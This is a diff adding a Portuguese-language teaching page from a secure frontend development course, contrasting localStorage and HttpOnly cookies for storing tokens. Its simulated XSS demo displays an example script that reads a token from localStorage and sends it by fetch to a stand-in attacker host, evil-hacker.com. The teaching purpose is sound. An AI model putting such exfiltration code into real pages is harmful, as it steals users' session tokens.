@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+  <title>Tokens e armazenamento</title>
+</head>
+<body class="min-h-screen bg-slate-950 text-slate-100">
+  <div class="min-h-screen flex flex-col">
+    <header class="sticky top-0 z-10 border-b border-slate-800 bg-slate-900/80 backdrop-blur">
+      <div class="max-w-5xl mx-auto flex items-center justify-between px-4 py-3">
+        <a href="001.html" class="text-sm font-semibold tracking-tight text-slate-100">
+          Desenvolvimento seguro no frontend
+        </a>
+        <nav class="flex items-center gap-3 text-xs sm:text-sm">
+          <a href="006.html" class="px-3 py-1 rounded-full bg-slate-800 hover:bg-slate-700">
+            ◀ Anterior
+          </a>
+          <div class="hidden md:flex items-center gap-1">
+            <a href="001.html" class="px-2 py-1 rounded-full hover:bg-slate-800">01</a>
+            <a href="002.html" class="px-2 py-1 rounded-full hover:bg-slate-800">02</a>
+            <a href="003.html" class="px-2 py-1 rounded-full hover:bg-slate-800">03</a>
+            <a href="004.html" class="px-2 py-1 rounded-full hover:bg-slate-800">04</a>
+            <a href="005.html" class="px-2 py-1 rounded-full hover:bg-slate-800">05</a>
+            <a href="006.html" class="px-2 py-1 rounded-full hover:bg-slate-800">06</a>
+            <a href="007.html" class="px-2 py-1 rounded-full bg-sky-500 text-slate-950 font-semibold">07</a>
+            <a href="008.html" class="px-2 py-1 rounded-full hover:bg-slate-800">08</a>
+            <a href="009.html" class="px-2 py-1 rounded-full hover:bg-slate-800">09</a>
+            <a href="010.html" class="px-2 py-1 rounded-full hover:bg-slate-800">10</a>
+            <a href="011.html" class="px-2 py-1 rounded-full hover:bg-slate-800">11</a>
+          </div>
+          <a href="008.html" class="px-3 py-1 rounded-full bg-sky-500 text-slate-950 font-semibold hover:bg-sky-400">
+            Próximo ▶
+          </a>
+        </nav>
+      </div>
+    </header>
+
+    <main class="flex-1">
+      <section class="max-w-5xl mx-auto px-4 py-10 space-y-8">
+        <header class="space-y-3">
+          <h1 class="text-3xl sm:text-4xl font-bold tracking-tight">
+            Tokens: localStorage, sessionStorage ou cookies?
+          </h1>
+          <p class="text-slate-300 text-sm sm:text-base">
+            Tradeoffs rápidos usando código.
+          </p>
+        </header>
+
+        <section class="space-y-4">
+          <div id="token-demo" class="rounded-2xl border border-slate-800 bg-slate-900/60 p-5 text-sm sm:text-base"></div>
+          <div class="flex flex-wrap gap-3">
+            <button onclick="demonstrarLocalStorage()"
+                    class="inline-flex items-center gap-2 rounded-full bg-rose-500 px-4 py-2 text-sm font-semibold text-slate-950 shadow-sm hover:bg-rose-400 cursor-pointer">
+              🚨 localStorage (inseguro)
+            </button>
+            <button onclick="demonstrarCookies()"
+                    class="inline-flex items-center gap-2 rounded-full bg-emerald-500 px-4 py-2 text-sm font-semibold text-slate-950 shadow-sm hover:bg-emerald-400 cursor-pointer">
+              ✅ HttpOnly Cookie (seguro)
+            </button>
+            <button onclick="simularXSS()"
+                    class="inline-flex items-center gap-2 rounded-full bg-slate-700 px-4 py-2 text-sm font-semibold text-slate-100 shadow-sm hover:bg-slate-600 cursor-pointer">
+              💀 Simular ataque XSS
+            </button>
+          </div>
+        </section>
+      </section>
+    </main>
+
+    <footer class="border-t border-slate-800 py-3 text-center text-xs text-slate-500">
+      Desenvolvimento seguro no frontend — Vinicios Neves
+    </footer>
+  </div>
+  
+  <script>
+    // Simulando um token JWT
+    const fakeToken = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxMjM0NSIsImVtYWlsIjoidXNlckBleGFtcGxlLmNvbSJ9.abc123";
+    
+    function demonstrarLocalStorage() {
+      // 🚨 Armazenando no localStorage (INSEGURO para tokens sensíveis)
+      localStorage.setItem("access_token", fakeToken);
+      
+      const demo = document.getElementById('token-demo');
+      demo.innerHTML = `
+        <div style="background: #ffe6e6; padding: 20px; border-radius: 5px; border: 2px solid red; margin: 10px 0; color: #111827;">
+          <h3>🚨 Usando localStorage (Vulnerável a XSS):</h3>
+          <pre style="background: white; padding: 15px; overflow-x: auto;">
+// Login: armazenando token
+localStorage.setItem("access_token", token);
+
+// Depois: recuperando token
+const token = localStorage.getItem("access_token");
+
+fetch("/api/profile", {
+  headers: {
+    Authorization: \`Bearer \${token}\`
+  }
+});</pre>
+          <p style="color: red; font-weight: bold;">
+            ⚠️ PROBLEMA: Qualquer script XSS pode roubar o token!
+          </p>
+          <p>Token atual no localStorage:</p>
+          <code style="background: white; padding: 10px; display: block; word-break: break-all;">
+            ${localStorage.getItem("access_token")}
+          </code>
+          <p style="margin-top: 10px;">
+            Digite no console: <code>localStorage.getItem("access_token")</code>
+          </p>
+        </div>
+      `;
+    }
+    
+    function demonstrarCookies() {
+      const demo = document.getElementById('token-demo');
+      demo.innerHTML = `
+        <div style="background: #e6ffe6; padding: 20px; border-radius: 5px; border: 2px solid green; margin: 10px 0; color: #111827;">
+          <h3>✅ Usando HttpOnly Cookies (Mais Seguro):</h3>
+          
+          <h4>Backend (Node.js/Express):</h4>
+          <pre style="background: white; padding: 15px; overflow-x: auto;">
+// Login: backend define o cookie
+app.post("/api/login", async (req, res) => {
+  const token = generateToken(user);
+  
+  res.cookie("access_token", token, {
+    httpOnly: true,      // ✅ JavaScript não pode acessar
+    secure: true,        // ✅ Apenas HTTPS
+    sameSite: "Strict",  // ✅ Proteção CSRF
+    maxAge: 3600000      // 1 hora
+  });
+  
+  res.json({ success: true });
+});</pre>
+
+          <h4>Frontend:</h4>
+          <pre style="background: white; padding: 15px; overflow-x: auto;">
+// Requisição: browser envia cookie automaticamente
+fetch("/api/profile", {
+  credentials: "include" // ✅ Inclui cookies
+});</pre>
+          
+          <p style="color: green; font-weight: bold; margin-top: 15px;">
+            ✅ VANTAGENS:
+          </p>
+          <ul style="color: #0a5c0a;">
+            <li><strong>httpOnly:</strong> JavaScript não consegue ler o cookie</li>
+            <li><strong>secure:</strong> Só transmite via HTTPS</li>
+            <li><strong>sameSite:</strong> Proteção contra CSRF</li>
+            <li><strong>Automático:</strong> Browser gerencia envio do cookie</li>
+          </ul>
+        </div>
+      `;
+    }
+    
+    function simularXSS() {
+      const tokenRoubado = localStorage.getItem("access_token");
+      
+      const demo = document.getElementById('token-demo');
+      
+      if (!tokenRoubado) {
+        demo.innerHTML = `
+          <div style="background: #fff3cd; padding: 20px; border-radius: 5px; border: 2px solid orange; margin: 10px 0; color: #111827;">
+            <p>⚠️ Clique primeiro em "localStorage (inseguro)" para armazenar um token.</p>
+          </div>
+        `;
+        return;
+      }
+      
+      demo.innerHTML = `
+        <div style="background: #2d2d2d; color: white; padding: 20px; border-radius: 5px; border: 2px solid red; margin: 10px 0;">
+          <h3>💀 Simulação de Ataque XSS:</h3>
+          <pre style="background: black; padding: 15px; overflow-x: auto; color: #0f0;">
+// Script malicioso injetado via XSS
+const stolenToken = localStorage.getItem("access_token");
+
+// Enviando token para servidor do atacante
+fetch("https://evil-hacker.com/steal", {
+  method: "POST",
+  body: JSON.stringify({
+    token: stolenToken,
+    site: window.location.href
+  })
+});
+
+console.log("Token roubado:", stolenToken);</pre>
+          
+          <p style="color: #ff6b6b; font-weight: bold; font-size: 1.2em;">
+            🚨 TOKEN ROUBADO COM SUCESSO!
+          </p>
+          <code style="background: black; padding: 10px; display: block; word-break: break-all; color: #0f0; margin: 10px 0;">
+            ${tokenRoubado}
+          </code>
+          
+          <p style="border-top: 1px solid #444; padding-top: 15px; margin-top: 15px;">
+            <strong>Se fosse um HttpOnly cookie:</strong><br>
+            <code style="color: #aaa;">document.cookie → "" (vazio, inacessível ao JS)</code><br>
+            <span style="color: #6fbf73;">✅ O ataque teria falhado!</span>
+          </p>
+        </div>
+      `;
+      
+      // Simulando log no console
+      console.log("%c💀 ATAQUE XSS SIMULADO", "color: red; font-size: 20px; font-weight: bold;");
+      console.log("Token roubado:", tokenRoubado);
+    }
+    
+    // Estado inicial
+    document.getElementById('token-demo').innerHTML = `
+      <div style="background: #f0f0f0; padding: 20px; border-radius: 5px; color: #111827;">
+        <h3 style="margin-top: 0;">💡 Demonstração Interativa</h3>
+        <p><strong>Explore as diferenças entre estratégias de armazenamento:</strong></p>
+        <ul style="line-height: 1.8;">
+          <li>🚨 Como localStorage expõe tokens a ataques XSS</li>
+          <li>✅ Como HttpOnly cookies protegem seus usuários</li>
+          <li>💀 Simulação real de um ataque XSS roubando tokens</li>
+        </ul>
+        <p style="margin-top: 15px; background: #ffe6e6; padding: 12px; border-radius: 5px; border-left: 4px solid red;">
+          <strong>⚠️ Regra de ouro:</strong> localStorage/sessionStorage + XSS = tokens roubados 💀
+        </p>
+      </div>
+    `;
+  </script>
+
+  <p>Mensagem pra reforçar: storage inseguro + XSS = combo do caos.</p>
+</body>
+</html>
